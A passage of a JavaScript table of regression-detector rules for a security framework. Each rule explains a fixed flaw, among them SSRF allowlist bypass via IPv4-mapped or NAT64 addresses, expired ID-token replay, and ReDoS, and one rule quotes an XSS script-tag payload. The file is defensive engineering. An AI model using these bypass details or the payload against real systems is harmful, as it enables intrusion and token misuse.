    reason: "CWE-532 secret/PII egress. v0.15.4 (#125) baked observability.redactAttrs() into every SPAN + METRIC attribute encoder but the detector was anchored on the _attr* function names, so it was blind to the LOG sinks whose encoders carry the OTLP-logs schema names. lib/log-stream-otlp.js (_toLogRecord meta + _serializeBatch resource) and lib/log-stream-otlp-grpc.js (_encodeLogRecord meta + _encodeResourceLogs resource) handed record.meta and resourceAttrs straight to _encodeAttrs/_encodeAttributes/_encodeResource — a log record's meta or a resource attribute holding a credential reached the collector unscrubbed. Root: 'every OTLP egress encoder redacts'; the span detector saw spans/metrics, this one sees logs. Fires on the raw `_encode*(record.meta` / `_encode*(resourceAttrs` / `_encodeResource(_resourceAttrs(cfg)` shape; the fix wraps the arg in observability().redactAttrs(...) (the span/metric contract), making the first paren token `observability` so the match goes silent.",
  },
  // #146 — every FINAL temp->dest rename must route through
  // atomicFile.renameWithRetry, the bounded retry on a Windows-transient
  // destination lock (EPERM/EACCES/EBUSY from AV / the search indexer /
  // Dropbox / OneDrive briefly holding the target). A bare nodeFs.renameSync
  // surfaces a transient lock as a hard failure (httpClient.downloadStream
  // shipped exactly that) and re-hand-rolls a retry the framework already owns
  // as a primitive. The ONLY legitimate bare renameSync is inside the
  // primitive itself (atomic-file.js _renameWithRetry).
  {
    id: "bare-renamesync-not-via-renamewithretry",
    primitive: "route every final temp->dest rename through atomicFile.renameWithRetry (the Windows rename-lock retry) instead of a bare nodeFs.renameSync / fs.renameSync — a transient AV / indexer / cloud-sync lock on the destination must be retried, not surfaced as a hard failure",
    scanScope: "lib",
    regex: /\b(?:nodeFs|fs)\.renameSync\(/,
    allowlist: [
      // atomic-file.js IS the primitive — _renameWithRetry wraps the one real
      // nodeFs.renameSync with the bounded transient-lock retry loop.
      "lib/atomic-file.js",
    ],
    reason: "#146 (user-surfaced). atomicFile.writeSync retries its final rename on a Windows-transient destination lock; httpClient.downloadStream's final rename was a bare nodeFs.renameSync, so a download into a cloud-synced / AV-scanned directory surfaced the transient lock as a hard failure. The retry was also hand-rolled and un-reusable. The fix exports atomic-file's _renameWithRetry as atomicFile.renameWithRetry and routes EVERY final temp->dest rename through it (downloadStream + vault/passphrase-ops + mtls-ca + log-stream-local + self-update + config-drift + archive-read + archive-tar-read + local-db-thin + restore-rollback). Fires on any bare nodeFs.renameSync/fs.renameSync; the only allowlisted use is atomic-file.js where the primitive's retry loop lives.",
  },
  // v0.15.9 — db.init() must construct its DatabaseSync with the SQLITE_LIMIT_*
  // sqlLength cap: a parse-time DoS floor that rejects a megaquery on the
  // raw-SQL surface. The ephemeral storage headroom probe (new DatabaseSync(p))
  // is a different construction and is not anchored. Fires if the main db handle
  // is built without the limits shape.
  {
    id: "db-databasesync-without-sqlite-limits",
    primitive: "construct every raw-SQL-exposing DatabaseSync opener (db.init's dbPath, the CLI's dbPath, localDb.thin's file) with the node:sqlite limits option (sqlLength) — a parse-time DoS floor complementary to streamLimit",
    scanScope: "lib",
    regex: /new DatabaseSync\(\s*(?:dbPath|file)\b/,
    requires: /sqlLength\s*:/,
    skipCommentLines: true,
    allowlist: [],
    reason: "v0.15.9 Node-24.16 adoption, widened v0.15.10 (#320). The framework parameterizes builder values, so SQLITE_LIMIT_LENGTH (sqlLength) guards the surfaces that parse operator/application raw SQL — b.db.runSql, the CLI, and b.localDb.thin's prepare()/exec() — against an attacker-influenced megaquery the parser would otherwise chew (SQLite default is 1 GB). Fires when a raw-SQL opener (`new DatabaseSync(dbPath` / `new DatabaseSync(file`) is constructed without the `limits: { ... sqlLength` shape. v0.15.9 anchored only on `dbPath` and so missed localDb.thin's `file` handle (#320); the var set now covers all three. The ephemeral headroom probe `new DatabaseSync(p)` and the vault-rotation temp handles are intentionally not matched — they run fixed PRAGMAs / parameterized re-seals, no attacker statement text. (SQLITE_LIMIT_ATTACHED is left at the SQLite default — the snapshot/backup path uses ATTACH.)",
  },
  {
    id: "trailing-hspace-regex-replace-is-quadratic",
    primitive: "strip trailing horizontal whitespace via safeBuffer.stripTrailingHspace(s) — NOT s.replace(TRAILING_HSPACE_RE) / .replace(/[ \\t]+$/)",
    scanScope: "lib",
    regex: /\.replace\(\s*(?:safeBuffer\.)?TRAILING_HSPACE_RE\b|\.replace\(\s*\/\[ \\t\]\+\$\/|(?:\/\[ \\t\]\+\$\/[gimsuy]*|\bTRAILING_HSPACE_RE)\.test\b/,
    skipCommentLines: true,
    allowlist: [],
    reason: "v0.15.11 (CodeQL js/polynomial-redos). `/[ \\t]+$/` (TRAILING_HSPACE_RE) used with .replace() is O(n^2) in V8 on adversarial input — a long run of spaces/tabs then a non-space makes the engine retry the greedy match from every offset (200K spaces ~12s; the env/yaml parsers cap TOTAL bytes, not per-line, so one huge-whitespace line hangs). safeBuffer.stripTrailingHspace is a linear backward char-scan, byte-identical to the regex. Every internal trailing-whitespace strip (safe-buffer/safe-env x3/safe-yaml x7) routes through it; TRAILING_HSPACE_RE stays exported for `.test()`-style existence checks (linear) but a `.replace(...TRAILING_HSPACE_RE)` is the regression. Empty allowlist.",
  },
  // v0.15.11 — locating a document-structural tag (<body>/<html>/<head>) in a
  // response body via `str.match(/<tag[^>]*>/)` is O(n^2) in V8: a body
  // carrying many `<tag` starts with no closing `>` (rendered user content
  // can produce exactly that) makes the engine retry the greedy `[^>]*` from
  // every offset. A `<body`-repeated 200K body benchmarks in seconds. The
  // response-injection middleware (bot-disclose, speculation-rules) must use
  // the linear safeBuffer.indexAfterOpenTag(html, tag) instead.
  {
    id: "html-tag-find-via-greedy-bracket-match-is-quadratic",
    primitive: "find a <tag>'s insertion point via safeBuffer.indexAfterOpenTag(html, tag) (linear indexOf walk) — NOT str.match(/<tag[^>]*>/)",
    scanScope: "lib",
    regex: /\.(?:match|search)\(\s*\/<\w+\[\^>\]\*>/,
    skipCommentLines: true,
    allowlist: [],
    reason: "v0.15.11 (CodeQL js/polynomial-redos, the #168/#170 response-injection shape). `body.match(/<body[^>]*>/i)` is the WORM-the-body-tag find both bot-disclose and speculation-rules used to splice content after <body>; the greedy `[^>]*`-then-`>` retries from every `<body` offset, O(n^2) on a body with many `<body` and no `>` (an app rendering user content into its HTML reaches it). safeBuffer.indexAfterOpenTag is a single forward indexOf walk, linear, and stricter (requires a real tag boundary so `<bodyfoo>` isn't a false <body>). Fires on the str.match(/<tag[^>]*>/) form; the WCAG checker's `/<body\\b[^>]*>/i.exec(html)` is the regex.exec(str) form on operator-rendered audit input (dev/CI, not a request hot path) and is a different shape, so it stays silent. Empty allowlist.",
  },
  // v0.15.11 (Codex P2) — mcp sanitize-mode redaction must remove EVERY
  // dangerous token, not just the leftmost. A non-global String.replace on a
  // multi-alternation regex strips only the first match, so
  // `data:text/html,<script>...` would keep the executable <script> and
  // sanitize mode would return runnable HTML. The fix routes both the
  // dangerous-HTML and prompt-injection redactions through _redactAll(t,
  // <RE>_G) — a global replace looped to a fixpoint.
  {
    id: "mcp-sanitize-redact-must-be-global",
    primitive: "redact dangerous-HTML / injection tokens in mcp sanitize mode via _redactAll(t, DANGEROUS_HTML_RE_G / INJECTION_RE_G) — NOT t.replace(DANGEROUS_HTML_RE / INJECTION_RE, ...) (non-global leaves every match after the first)",
    scanScope: "lib",
    regex: /\.replace\(\s*(?:DANGEROUS_HTML_RE|INJECTION_RE)\s*,/,
    skipCommentLines: true,
    allowlist: [],
    reason: "v0.15.11 (Codex P2). A non-global String.replace removes only the LEFTMOST match; on `data:text/html,<script>alert(1)</script>` it strips `data:text/html` and leaves the executable <script>, so sanitize mode returns runnable HTML for the exact vector the vbscript:/data:text/html alternation was added to neutralize. The fix is _redactAll(t, <RE>_G): a global replace repeated to a fixpoint so every dangerous token is removed. The _G global variants do NOT match this regex (`RE_G,` has no `\\s*,` right after `RE`), so the fixed call stays silent; a reverted non-global `.replace(DANGEROUS_HTML_RE,` / `.replace(INJECTION_RE,` fires. Empty allowlist.",
  },
  // v0.15.9 — the RFC 9527 Clear-Site-Data header value must be built via the
  // shared middleware/clear-site-data headerValue() helper (which validates
  // each directive against the known set), not a hand-rolled quoted-token
  // string. A literal `setHeader("Clear-Site-Data", '"cookies", ...')` skips
  // the directive validation and re-hand-rolls the RFC 9527 quoting the
  // primitive owns (the b.session.logout extraction lesson).
  {
    id: "clear-site-data-header-hand-rolled",
    primitive: "build the Clear-Site-Data response header via clearSiteData.headerValue(types) (validated RFC 9527 quoting) — do not hand-roll the quoted-directive string literal in setHeader",
    scanScope: "lib",
    regex: /setHeader\(\s*["']Clear-Site-Data["']\s*,\s*["']/,
    skipCommentLines: true,
    allowlist: [],
    reason: "v0.15.9 (Clear-Site-Data logout wiring). The middleware/clear-site-data headerValue() helper is the single builder of the RFC 9527 §3 quoted-token list and validates every directive against KNOWN_TYPES; both emitters (the middleware's create() and b.session.logout) route through it. A literal `setHeader(\"Clear-Site-Data\", '\"cookies\", ...')` hand-rolls the quoting and skips the validation. Fires when the second setHeader arg is a string literal; the live emitters pass a var/call so they stay silent.",
  },
  // #131 — the b.middleware.dpop factory must REQUIRE its replayStore at config
  // time. The store is DPoP's jti-replay defense (RFC 9449 §11.1); reading it
  // optionally and gating the check behind `if (replayStore)` silently mounts a
  // proof-of-possession middleware that performs no replay check when the
  // operator omits the store. The middleware (operator security default) must
  // enforce presence + the checkAndInsert shape with validateOpts.requireMethods;
  // the low-level verify() primitive keeps its documented optional replayStore.
  {
    id: "dpop-middleware-replaystore-not-required",
    primitive: "enforce opts.replayStore presence + checkAndInsert shape at b.middleware.dpop create() via validateOpts.requireMethods(opts.replayStore, [\"checkAndInsert\"], ...) — a missing store silently disables DPoP jti-replay defense (RFC 9449)",
    scanScope: "lib",
    regex: /var replayStore\s*=\s*opts\.replayStore/,
    requires: /requireMethods\(\s*opts\.replayStore/,
    skipCommentLines: true,
    allowlist: [],
    reason: "#131 — b.middleware.dpop documented replayStore as required but create() read it optionally (`var replayStore = opts.replayStore`) and gated the replay check behind `if (replayStore)`, so omitting it mounted a DPoP gate with NO jti-replay defense — a captured proof replays indefinitely (RFC 9449 §11.1). The operator-facing middleware must fail closed at config time: validateOpts.requireMethods(opts.replayStore, [\"checkAndInsert\"], ...) throws on both a missing store and a store lacking checkAndInsert. The unique `var replayStore = opts.replayStore` token is the middleware's optional read (the low-level lib/auth/dpop.js verify() primitive uses opts.replayStore inline and keeps it deliberately optional, so it is not matched). This entry fires only if the create-time requireMethods enforcement is removed while the optional read remains.",
  },
  // #135 — SD-JWT-VC ES256/ES384 must sign/verify with JOSE encoding (raw r||s).
  {
    id: "sd-jwt-vc-ecdsa-der-not-ieee-p1363",
    primitive: "sd-jwt-vc _signJwt / _verifyJwt must wrap the EC key with dsaEncoding: \"ieee-p1363\" for ES256/ES384 — node:crypto defaults to DER, which every conformant JOSE / EUDI-wallet verifier rejects (and the library would reject their raw-r||s signatures)",
    scanScope: "lib",
    regex: /nodeCrypto\.sign\(\s*sigAlgo\s*,\s*Buffer\.from\([^)]*\)\s*,\s*privateKey\s*\)|nodeCrypto\.verify\(\s*sigAlgo\s*,\s*Buffer\.from\([^)]*\)\s*,\s*publicKey\s*,/,
    allowlist: [],
    reason: "#135 — _signJwt/_verifyJwt passed the bare EC key (`, privateKey)` / `, publicKey,`) to nodeCrypto.sign/verify, so ES256/ES384 ECDSA signatures were DER-encoded (ASN.1 SEQUENCE, leading 0x30, ~70-72 bytes for P-256). JOSE/JWS — and EUDI wallets — require raw r||s (\"ieee-p1363\", 64 bytes for ES256, 96 for ES384), so tokens this issuer signed were rejected by conformant verifiers and the library rejected conformant wallets' KB-JWTs. The fix routes both calls through _ecKeyParam(algorithm, key), which returns { key, dsaEncoding: \"ieee-p1363\" } for ES256/ES384 — matching oauth.js / dpop.js / jwt-external.js _verifyParamsForAlg. The anchor is the bare-key call shape (3rd arg is the literal `privateKey` / `publicKey` identifier); once wrapped in _ecKeyParam the shape no longer matches. The KB-JWT (holder) and issuer JWT both sign through this single _signJwt, so the one fix closes both.",
  },
  // #137 — verifyIdToken's skipExpCheck must be gated to logout tokens.
  {
    id: "oauth-verifyidtoken-skipexpcheck-ungated",
    primitive: "verifyIdToken must NOT honor a caller-passable skipExpCheck on a regular ID token — the exp bypass is only valid for OIDC Back-Channel-Logout tokens (events claim), and even then bounded by an iat freshness floor; a bare `if (!vopts.skipExpCheck)` gate lets any caller verify an expired/replayed credential clean",
    scanScope: "lib",
    regex: /if \(!vopts\.skipExpCheck\)/,
    requires: /skip-exp-check-not-allowed/,
    skipCommentLines: true,
    allowlist: [],
    reason: "#137 — verifyIdToken wrapped its exp validation in `if (!vopts.skipExpCheck) { ... }` so any external caller (verifyIdToken is a public API) could pass skipExpCheck: true and verify an EXPIRED id_token clean — token-replay of expired-but-once-valid credentials. skipExpCheck exists only because OIDC Back-Channel Logout 1.0 §2.4 logout tokens carry no exp; the internal verifyBackchannelLogoutToken passes it. The fix flips the branch to `if (vopts.skipExpCheck) { <require the backchannel-logout events claim> + <iat freshness floor> } else { <exp check> }`, so skipExpCheck is refused (auth-oauth/skip-exp-check-not-allowed) on any token lacking the logout event claim and a stale logout token is refused (auth-oauth/logout-token-stale). The detector anchors on the bare negative gate and requires the new refusal code in-file; after the fix the bare gate is gone and the code is present, so it stays silent.",
  },
  // #130 — scheduler _runFire settle handlers must guard on the run generation.
  {
    id: "scheduler-runfire-settle-no-generation-guard",
    primitive: "scheduler._runFire's promise settle handlers must ignore a stale settle (if task.runGeneration !== gen return) before writing task state / emitting success|failure — the watchdog force-clears running and re-fires, so an abandoned run's late resolve otherwise clobbers the current run's state and double-emits",
    scanScope: "lib",
    regex: /Promise\.resolve\(promise\)\.then\(function \([^)]*\)\s*\{\s*task\.running = false/,
    allowlist: [],
    reason: "#130 — _runFire attaches success/failure settle handlers that unconditionally wrote task.running=false / runningSince=0 / lastFinish / lastError and emitted system.scheduler.task.success|failure. But the watchdog (maxJobMs) force-clears task.running on a hung run and _fireOnce re-fires, so the original slow promise settles LATE and clobbers the new run's running flag (disabling the watchdog for it / allowing a third concurrent fire) and emits a stale success for a run the watchdog already reported as a watchdog failure. The fix tags each run (task.runGeneration, bumped by _runFire AND the watchdog) and the settle handlers `return` early when the tag is stale. The detector fires while the success handler sets task.running=false with no intervening generation guard and goes silent once the `if (task.runGeneration !== gen) return;` guard precedes it; behavioral guard is scheduler-watchdog-stale-settle.test.js.",
  },
  // #121 — retention.complianceFloor must inherit the active posture.
  {
    id: "retention-compliancefloor-ignores-active-posture",
    primitive: "retention.complianceFloor must fall back to STATE.activePosture (set by applyPosture / the b.compliance.set cascade) when no explicit posture is passed — it hard-required a string posture and never read the active value, so the advertised optional-posture inheritance was unimplemented dead state",
    scanScope: "lib",
    regex: /function complianceFloor\s*\([^)]*\)\s*\{(?:(?!STATE\.activePosture)[\s\S]){0,300}?must be a string/,
    allowlist: [],
    reason: "#121 — applyPosture() records STATE.activePosture + STATE.activeFloorMs and both its docstring and the STATE comment advertise that complianceFloor callers without an explicit posture inherit the active value. But complianceFloor threw `posture must be a string` immediately and never consulted STATE.activePosture, so the inheritance never worked and activeFloorMs was a dead write. The fix inherits STATE.activePosture when posture is omitted (a numeric first arg is taken as candidateTtlMs so complianceFloor(ttl) works), and applyPosture(null) now clears the state (was a silent no-op, so b.compliance.clear couldn't reset it). The tempered span fires while complianceFloor reaches its `must be a string` throw without first reading STATE.activePosture; the behavioral guard is retention-floor.test.js.",
  },
  // #111 — credential-hash needsRehash must drive SHAKE256 length-rotation.
  {
    id: "credentialhash-needsrehash-ignores-shake256-length",
    primitive: "credentialHash.needsRehash must compare the stored SHAKE256 digest length against the configured/default length — without it, raising the SHAKE256 output length never triggers a rehash and the advertised length-rotation is a silent no-op",
    scanScope: "lib",
    regex: /function needsRehash\s*\([^)]*\)\s*\{(?=[\s\S]*?CRED_HASH_IDS\.ARGON2ID)(?:(?!CRED_HASH_IDS\.SHAKE256)(?!\n\})[\s\S]){0,1200}\n\}/,
    allowlist: [],
    reason: "#111 — needsRehash short-circuited the SHAKE256 case to `return false`: it checked the algorithm id and (for Argon2id) deferred to the password module's parameter-lag check, but never compared decoded.payload.length against the configured target length. So once an operator raised the SHAKE256 output length, every existing shorter digest reported needsRehash === false and the length-rotation the primitive advertises never fired (b.apiKey.verify's rehash-on-verify silently kept the old length). The fix adds, for the SHAKE256 branch, a compare of decoded.payload.length to (opts.params.length || SHAKE256_DEFAULT_LENGTH) → rehash when they differ. The tempered span anchors on needsRehash and fires while its body never references SHAKE256_DEFAULT_LENGTH (the length-target constant); the behavioral guard is credential-hash.test.js.",
  },
  // #136 — SD-JWT KB-JWT aud / nonce must compare constant-time.
  {
    id: "sdjwt-kbjwt-aud-nonce-non-consttime-compare",
    primitive: "the SD-JWT KB-JWT audience + nonce checks must compare with the constant-time _timingSafeEqStr helper (as the sd_hash check already does), not a bare !== — the nonce is a verifier-issued replay-defense value and a timing channel leaks a guess oracle; constant-time-ness cannot be asserted behaviorally, so this structural detector is the guard",
    scanScope: "lib",
    regex: /kbParsed\.payload\.(?:aud|nonce)\s*!==\s*opts\.(?:audience|nonce)/,
    allowlist: [],
    reason: "#136 — verify()'s KB-JWT binding checks compared `kbParsed.payload.aud !== opts.audience` and `kbParsed.payload.nonce !== opts.nonce` with a short-circuiting !==, while the adjacent sd_hash check already used the constant-time _timingSafeEqStr. The nonce is a per-presentation replay-defense value the verifier issued; a non-constant-time compare leaks a matching-prefix timing oracle. The fix routes both through _timingSafeEqStr (the framework's hash/token-compare discipline). A behavioral test can prove the accept/reject correctness but NOT the timing property, so this detector is the primary guard per the test-with-fix rule's structural-drift exception; it fires on the bare !== shape and goes silent once both use _timingSafeEqStr.",
  },
  // canonicalizeHost must fold an IPv4-mapped IPv6 address to its IPv4 form.
  {
    id: "ssrf-canonicalizehost-v4mapped-not-folded",
    primitive: "ssrfGuard.canonicalizeHost must fold an IPv4-mapped IPv6 address (::ffff:0:0/96) to its dotted IPv4 form — leaving it as IPv6 means a dual-stack peer on ::ffff:1.2.3.4 never unifies with an operator's 1.2.3.4 allowlist entry (an SSRF allowlist bypass the canonicalizer exists to defend)",
    scanScope: "lib",
    regex: /if \(family === 6\)\s*\{(?:(?!IPV6_V4_MAPPED_PREFIX)[\s\S]){0,400}?_ipv6BytesToString/,
    allowlist: [],
    reason: "canonicalizeHost's IPv6 branch emitted the RFC 5952 hex string for every IPv6 input, including IPv4-mapped (::ffff:a.b.c.d). But an IPv4-mapped address IS the IPv4 address a.b.c.d for routing/access — classify() already re-classifies it by the embedded v4, and a dual-stack listener reaching ::ffff:1.2.3.4 is the same host as 1.2.3.4. Without folding, canonicalize(::ffff:1.2.3.4) !== canonicalize(1.2.3.4), so an allowlist/dedup/SSRF comparison built on the canonical form is bypassed by presenting the dual-stack spelling. The fix folds the ::ffff:0:0/96 block to dotted IPv4 (only that block — 6to4/NAT64 are translation mechanisms, and a v4 suffix in any other prefix is a distinct address). The tempered span fires while the family-6 branch reaches _ipv6BytesToString with no IPV6_V4_MAPPED_PREFIX check first; the behavioral guard is safe-url-canonicalize.test.js.",
  },
  // compliance.clear must cascade the posture-clear to the primitives.
  {
    id: "compliance-clear-no-cascade",
    primitive: "compliance.clear() must cascade the posture reset to the primitives (_applyPostureCascade(null)) just as set() cascades the posture — otherwise a primitive that inherits the active posture (retention.complianceFloor) keeps applying the stale floor after b.compliance.clear()",
    scanScope: "lib",
    regex: /_emitAudit\("compliance\.posture\.cleared"/,
    requires: /_applyPostureCascade\(null\)/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P2 — b.compliance.set(posture) calls _applyPostureCascade(posture), which walks retention/audit/db/cryptoField calling applyPosture(posture); retention records it so complianceFloor() inherits it. b.compliance.clear() nulled only compliance's own STATE.posture and never cascaded, so after set(\"hipaa\") then clear(), compliance.current() is null but retention still inherits the stale HIPAA floor. clear() must call _applyPostureCascade(null) so each primitive's applyPosture(null) resets it (retention.applyPosture(null) clears its active posture). The detector fires while clear() exists with no _applyPostureCascade(null) call anywhere in the file (set() passes the posture, not null) and goes silent once clear() cascades the reset; the behavioral guard is retention-floor.test.js.",
  },
  // canonicalizeHost must NOT fold NAT64/6to4 (would flip an SSRF classify verdict).
  {
    id: "ssrf-canonicalizehost-folds-nat64",
    primitive: "ssrfGuard.canonicalizeHost must fold ONLY the IPv4-mapped block (::ffff:0:0/96) to IPv4 — NOT NAT64 (64:ff9b::/96). classify() treats a NAT64 literal as `classify(v4) || \"reserved\"`, so folding a public NAT64 address to its embedded IPv4 turns a blocked verdict into an allowed one (canonicalize-then-classify must agree with classify alone)",
    scanScope: "lib",
    regex: /_ipv6PrefixMatch\(\s*IPV6_NAT64_PREFIX\s*,\s*C\.BYTES\.bytes\(96\)\s*,\s*v6bytes\s*\)/,
    allowlist: [],
    reason: "canonicalizeHost folds an IPv4-mapped IPv6 host to its embedded IPv4 because classify(::ffff:x) === classify(x) (that branch has no reserved fallback), so the fold can't change an SSRF verdict. NAT64 is different: classify('64:ff9b::8.8.8.8') is `classify('8.8.8.8') || 'reserved'` = 'reserved' (blocked) while classify('8.8.8.8') is null (allowed) — so folding a public NAT64 literal to 8.8.8.8 before an allowlist/classify check flips a blocked address to an allowed public IPv4 (Codex P2). canonicalizeHost must leave NAT64 / 6to4 as IPv6; classify still reaches the embedded v4 for the deny side. The detector anchors on canonicalizeHost's NAT64 prefix-match (it uses the local `v6bytes`, so classify()'s own legitimate NAT64 extraction — which uses `bytes` — is not matched) and goes silent once canonicalizeHost no longer folds NAT64. The behavioral guard is the classify-agreement invariant in safe-url-canonicalize.test.js.",
  },
  // #134 — verifyIdToken must check azp on multi-audience ID tokens.
  {
    id: "oauth-verifyidtoken-no-azp-check",
    primitive: "verifyIdToken must verify the azp (authorized party) claim — OIDC Core §3.1.3.7: a multi-audience ID token requires an azp, and a present azp MUST equal the RP's client_id. Checking only that aud contains clientId lets a token minted for a DIFFERENT authorized party (that merely lists this RP in a multi-aud array) verify clean (confused deputy)",
    scanScope: "lib",
    regex: /throw new OAuthError\("auth-oauth\/aud-mismatch"/,
    requires: /auth-oauth\/azp-mismatch/,
    skipCommentLines: true,
    allowlist: [],
    reason: "#134 — verifyIdToken validated only `aud.indexOf(clientId) !== -1` (throwing auth-oauth/aud-mismatch) and ignored azp. OIDC Core §3.1.3.7 requires: if the ID token carries multiple audiences the Client must verify an azp is present, and if azp is present its value must be the Client's client_id. Without it, an IdP-issued token whose authorized party is a DIFFERENT client but whose aud array also lists this RP verifies clean — a confused-deputy / token-substitution hole. The fix adds, right after the aud check: reject when aud.length > 1 and no azp (auth-oauth/azp-required), and reject when azp is present and !== clientId (auth-oauth/azp-mismatch). The detector anchors on verifyIdToken's unique aud-mismatch throw and requires the azp-mismatch code in-file; the single-aud no-azp token (the common case) is unaffected.",
  },
  // #116 — crypto-field upgrade-on-read rewrite must honor the handle's dialect.
  {
    id: "cryptofield-upgrade-on-read-hardcodes-sqlite-dialect",
    primitive: "_upgradeDerivedHashesOnRead must build its durable re-hash UPDATE with the resolved dialect of the writable handle, not a hardcoded dialect: \"sqlite\" — unsealRow accepts a caller-supplied Postgres/MySQL handle, and a sqlite-quoted UPDATE (double quotes) is rejected by MySQL (backticks), so the advertised keyed-MAC migration silently no-ops off sqlite",
    scanScope: "lib",
    regex: /function _upgradeDerivedHashesOnRead(?:(?!\nfunction )[\s\S]){0,4000}?sql\.update\(\s*table\s*,\s*\{\s*dialect:\s*"sqlite"/,
    allowlist: [],
    reason: "#116 — the upgrade-on-read durable rewrite (re-hash a legacy salted-sha3 derived-hash column to the keyed MAC) hardcoded sql.update(table, { dialect: \"sqlite\", quoteName: true }). unsealRow's 4th arg is a caller-supplied dbHandle that db-query threads from an external Postgres/MySQL connection; on a MySQL handle the sqlite-dialected UPDATE emits double-quoted identifiers (\"users\"), which MySQL parses as a string literal and rejects, so the rewrite throws into the best-effort try/catch and the legacy digest stays on disk — keyed-MAC migration never happens off sqlite. The fix resolves the dialect from handle.dialect (validated to postgres|mysql|sqlite, default sqlite — db-query._dialect()'s contract). The detector anchors INSIDE _upgradeDerivedHashesOnRead (the function-scoped span) so the legitimately-sqlite-only _PER_ROW_SQL_OPTS literal at module scope is not flagged; it fires while the literal dialect: \"sqlite\" remains and goes silent once it reads the handle's dialect.",
  },
  // #126 — SSE _writeRaw must bound its outbound buffer (slow-consumer DoS).
  {
    id: "sse-writeraw-no-bounded-buffer",
    primitive: "sse _writeRaw must bound the per-channel outbound buffer (res.writableLength vs a maxBufferedBytes cap) and evict a slow consumer — res.write() returning false is unbounded backpressure; a stalled client otherwise grows the server heap without limit (memory-exhaustion DoS)",
    scanScope: "lib",
    regex: /function _writeRaw\b/,
    requires: /writableLength/,
    skipCommentLines: true,
    allowlist: [],
    reason: "#126 — _writeRaw called res.write(s) and discarded the boolean return (the backpressure signal) with no bound on res.writableLength (Node's count of buffered-but-unflushed bytes). SSE is server-push: when a client stalls, the app keeps calling send() and the writable buffer grows without limit until the heap is exhausted — one slow connection is a memory-exhaustion DoS. The fix reads res.writableLength after each write and, when it exceeds the per-channel maxBufferedBytes cap (default 1 MiB), closes the channel and throws sse/backpressure — evicting the slow consumer instead of buffering forever (the bounded-write discipline lib/archive.js already follows). The detector fires while _writeRaw never consults writableLength and goes silent once the cap lands; a healthy client (writableLength ~0) is never evicted.",
  },
  // #141 — sealed-field membership (IN) must hash each candidate element.
  {
    id: "db-query-sealed-in-hashes-whole-array",
    primitive: "db-query's sealed-field → derived-hash rewrite must map EACH element of an IN candidate list through cryptoField.lookupHash (and include each one's legacy digest for dual-read) — passing the whole array to lookupHash as a single value produces one bogus hash and makes whereIn/$in on a sealed column throw or silently miss",
    scanScope: "lib",
    regex: /if \(this\._isSealedField\(field\)\)\s*\{(?:(?!op === "IN")[\s\S]){0,200}?cryptoField\.lookupHash/,
    allowlist: [],
    reason: "#141 — _resolvePredicate's sealed-field branch called cryptoField.lookupHash(this._cryptoFieldKey(), field, value) once with the raw value. For op \"=\"/\"!=\" that value is a scalar, but for op \"IN\" (b.db.from().whereIn(sealedCol, [...]) / b.db.collection().find({ sealedCol: { $in: [...] } })) it is the candidate ARRAY — lookupHash then hashes the array-as-one-value, and the later `where IN requires a non-empty array` shape check throws, so membership queries on a sealed column were unusable (the documented derived-hash query path supported equality but not membership). The fix branches on op === \"IN\" inside the sealed block and maps each element through lookupHash, building the combined IN-list with each element's keyed + legacy digest (the same dual-read the \"=\" path does across the v0.15.0 keyed-MAC flip). The tempered span fires while the sealed block reaches lookupHash with no `op === \"IN\"` branch first and goes silent once that branch precedes the per-element lookup; the {0,200} bound is a ReDoS backstop above the ~60-char buggy span.",
  },
  // #127 — worker-pool must mark a slot recycling BEFORE _finishTask drains the queue.
  {
    id: "workerpool-finishtask-before-recycling-mark",
    primitive: "_onTaskTimeout / _onWorkerError must set slot.recycling = true BEFORE calling _finishTask — _finishTask sets slot.busy = false and drains the queue, so a freshly-queued task would be dispatched to the slot whose worker is about to be terminated (the task dies with workerpool/worker-exit instead of running on the replacement worker)",
    scanScope: "lib",
    regex: /function _onTaskTimeout\s*\([^)]*\)\s*\{(?:(?!slot\.recycling = true)[\s\S]){0,600}?_finishTask\(slot|function _onWorkerError\s*\([^)]*\)\s*\{(?:(?!slot\.recycling = true)[\s\S]){0,600}?_finishTask\(slot/,
    allowlist: [],
    reason: "#127 — _finishTask() sets slot.busy = false and ends with _drainQueue(); _findIdleSlot() returns any slot that is `!busy && !recycling`. _onTaskTimeout/_onWorkerError called _finishTask FIRST and only marked the slot recycling afterward (in _recycleWorker), so the synchronous drain inside _finishTask handed a just-queued task to the dying slot — its message went to a worker about to be terminate()d and came back as workerpool/worker-exit (or hung), even though a healthy replacement was about to spawn. The fix sets slot.recycling = true before _finishTask in both handlers so the drain skips the dying slot and the queued task waits for the replacement. The tempered span fires while _finishTask(slot is reached before the recycling mark in either handler and goes silent once the mark precedes it; the {0,600} bound is a ReDoS backstop above the ~15-line handler bodies.",
  },
  // #128 — outbox must reap stale in-flight claims before claiming new work.
  {
    id: "outbox-processonce-claims-without-reaping",
    primitive: "outbox._processOnce must call _reapStaleInflight() BEFORE _claimBatch() — a claim flips a row to in-flight (status), and the claim path only selects status='pending', so a crash between claim and mark-published strands the row in-flight forever (at-least-once violated). The poll must reclaim stale in-flight rows each cycle",
    scanScope: "lib",
    regex: /async function _processOnce\s*\([^)]*\)\s*\{(?:(?!_reapStaleInflight)[\s\S]){0,400}?_claimBatch/,
    allowlist: [],
    reason: "#128 — the outbox claims jobs by flipping status pending → in-flight, but _claimBatch only SELECTs status='pending'. With no reaper, a publisher that claims a row then crashes before _markPublished/_markRetry/_markDead leaves the row in-flight forever — the event is silently dropped and the advertised at-least-once delivery is violated (b.queue has sweepExpired; outbox had nothing). The fix stamps claimed_at on claim and reaps any in-flight row older than claimReclaimMs (or NULL claimed_at, a legacy/crashed claim) back to pending at the top of every poll, before _claimBatch. The tempered span fires while _processOnce reaches _claimBatch without a preceding _reapStaleInflight call and goes silent once the reap precedes the claim; the {0,400} bound is a ReDoS backstop above the short body. The behavioral guard is test/layer-0-primitives/outbox-inflight-reaper.test.js.",
  },
  // #133 — SAML Bearer/HoK SubjectConfirmation NotOnOrAfter must fail closed.
